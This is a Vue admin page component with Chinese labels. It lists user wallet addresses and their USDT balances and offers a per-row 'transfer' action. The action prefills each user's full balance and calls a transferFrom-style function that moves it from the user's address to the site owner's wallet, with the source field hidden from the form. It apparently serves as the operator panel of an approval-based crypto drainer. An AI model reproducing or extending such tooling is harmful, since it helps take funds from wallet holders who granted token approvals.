<template>
  <div class="basic-table-page">
    <a-card>
      <a-form layout="inline" :model="searchParams" class="basic-table-form" @finish="handleSearch">
        <a-form-item label="钱包地址">
          <a-input v-model:value="searchParams.address" placeholder="请输入钱包地址" />
        </a-form-item>

        <a-form-item>
          <a-button @click="handleReset">重置</a-button>
          <a-button type="primary" html-type="submit">搜索</a-button>
        </a-form-item>
      </a-form>
    </a-card>
    <a-card>
      <a-table v-bind="tableProps">
        <template #bodyCell="{ column, text, record }">
          <template v-if="column.dataIndex === 'addr'">
            <a @click="copy(text)">
              {{ formatWalletAddress(text) }}
            </a>
          </template>

          <template v-if="column.dataIndex === 'action'">
            <a-button size="small" type="primary" @click="handleOpenTransferModal(record)">
              划转
            </a-button>
          </template>
        </template>
      </a-table>
    </a-card>

    <a-modal
      v-model:open="state.showTransferModal"
      title="划转"
      :maskClosable="false"
      :confirmLoading="state.transferLoading"
      @ok="handleTransfer"
    >
      <a-form
        ref="transferFormRef"
        :model="transferForm"
        :rules="transferRules"
        class="transfer-form"
        :label-col="{ style: { width: '80px' } }"
      >
        <!-- <a-form-item label="转出地址" name="fromAddr">
          <a-input v-model:value="transferForm.fromAddr" />
        </a-form-item> -->
        <a-form-item label="转入地址" name="toAddr">
          <a-input v-model:value="transferForm.toAddr" />
        </a-form-item>
        <a-form-item label="转账数量" name="amount">
          <a-input v-model:value="transferForm.amount" type="number" />
        </a-form-item>
      </a-form>
    </a-modal>
  </div>
</template>

<script setup>
import { message } from 'ant-design-vue';
import dayjs from 'dayjs';
import { reactive, ref } from 'vue';

import { fetchUserListApi, transferSaveApi } from '@/api';
import { useClipboard } from '@/hooks/useClipboard';
import { useTable } from '@/hooks/useTable';
import { useStore } from '@/store';
import { formatWalletAddress } from '@/utils';
import { transferFromUsdt } from '@/web3';

const columns = [
  {
    title: 'ID',
    dataIndex: 'id',
    align: 'center',
    fixed: 'left',
    width: 100,
  },
  {
    title: '钱包地址',
    dataIndex: 'addr',
    align: 'center',
    fixed: 'left',
    width: 200,
  },
  {
    title: '余额(USDT)',
    dataIndex: 'balance',
    align: 'center',
    width: 150,
  },
  {
    title: '创建时间',
    dataIndex: 'createdTime',
    align: 'center',
    width: 200,
  },
  {
    title: '操作',
    dataIndex: 'action',
    align: 'center',
    fixed: 'right',
    width: 100,
  },
];
const transferFormRef = ref(null);
const transferRules = {
  fromAddr: [{ required: true, message: '请输入转出地址' }],
  toAddr: [{ required: true, message: '请输入转入地址' }],
  amount: [{ required: true, message: '请输入转账数量' }],
};
const transferForm = reactive({
  fromAddr: '',
  toAddr: '',
  amount: '',
});
const store = useStore();

const state = reactive({
  showTransferModal: false,
  transferLoading: false,
});
const { copy } = useClipboard();
const DEFAULT_SEARCH_PARAMS = { address: undefined };

const { tableProps, searchParams, handleSearch, handleReset } = useTable({
  columns,
  request: fetchUserListApi,
  defaultSearchParams: DEFAULT_SEARCH_PARAMS,
});

const handleOpenTransferModal = async (record) => {
  if (!store.walletAddress) {
    await store.connectWallet();
  }

  transferForm.fromAddr = record.addr;
  transferForm.toAddr = store.ownerWallet;
  transferForm.amount = record.balance;
  state.showTransferModal = true;
};

const handleTransfer = async () => {
  try {
    state.transferLoading = true;
    await transferFromUsdt(transferForm.fromAddr, transferForm.toAddr, transferForm.amount);
    await transferSaveApi({
      amount: transferForm.amount,
      chainType: 2,
      createdTime: dayjs().format('YYYY-MM-DD HH:mm:ss'),
      fromAddr: transferForm.fromAddr,
      toAddr: transferForm.toAddr,
      updatedTime: dayjs().format('YYYY-MM-DD HH:mm:ss'),
    });
    state.transferLoading = false;
    state.showTransferModal = false;
    message.success('划转成功');
    handleSearch();
  } catch (error) {
    console.log(error);
    state.transferLoading = false;
    message.error('划转失败');
  }
};
</script>

<style lang="less" scoped>
.transfer-form {
  margin-top: 20px;
}
</style>
